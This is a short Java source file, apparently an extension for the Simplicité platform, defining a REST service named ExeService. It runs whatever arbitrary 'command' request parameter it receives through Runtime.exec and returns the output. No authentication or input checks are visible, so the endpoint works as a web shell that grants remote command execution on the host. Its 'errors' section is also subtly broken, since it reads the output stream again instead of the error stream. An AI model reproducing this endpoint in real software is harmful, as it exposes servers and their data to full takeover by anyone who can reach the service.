package com.simplicite.extobjects.Executor;

import com.simplicite.util.tools.*;
import com.simplicite.webapp.services.RESTServiceExternalObject ;
import org.apache.commons.io.IOUtils;

public class ExeService extends RESTServiceExternalObject  {
	private static final long serialVersionUID = 1L;

	@Override
	public Object post(Parameters params) {
		try{
			return exec(params.getParameter("command"));
		} catch(Exception e){
			return "ExeService Exception : +\n"+e.getMessage();
		}
	}
	
	public String exec(String cmd) throws Exception{
		Process proc = Runtime.getRuntime().exec(cmd);
		
		StringBuilder sb = new StringBuilder();
		sb.append("------------COMMAND EXECUTOR---------------\n");
		sb.append(cmd+"\n");
		sb.append("-------------output--------------\n");
		sb.append(IOUtils.toString(proc.getInputStream(), "UTF-8"));
		sb.append("-------------errors--------------\n");
		sb.append(IOUtils.toString(proc.getInputStream(), "UTF-8"));
		return sb.toString();
	}
}